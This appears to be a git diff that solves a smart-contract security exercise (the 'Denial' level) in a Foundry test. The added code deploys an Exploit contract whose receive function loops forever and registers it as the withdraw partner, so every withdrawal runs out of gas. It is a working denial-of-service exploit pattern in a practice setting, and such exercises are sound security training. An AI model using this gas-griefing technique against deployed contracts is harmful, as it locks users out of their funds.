@@ -37,8 +37,25 @@ contract TestDenial is BaseTest {
         /**
          * CODE YOUR EXPLOIT HERE
          */
+
+        // This is a deny of service problem, we have to reject any call to the withdraw function
+        // We can do this by setting the exploit contract as the partner and then calling the withdraw function
+        // The exploit contract will run an infite loop on the receive function, so the transaction will run out of gas
+
         vm.startPrank(player, player);
 
+        // Deploy the exploit contract
+        Exploit exploit = new Exploit();
+
+        // Set exploit to be the partner
+        level.setWithdrawPartner(address(exploit));
+
         vm.stopPrank();
+    }
+}
+
+contract Exploit {
+    receive() external payable {
+        while (true) {}
     }
 }
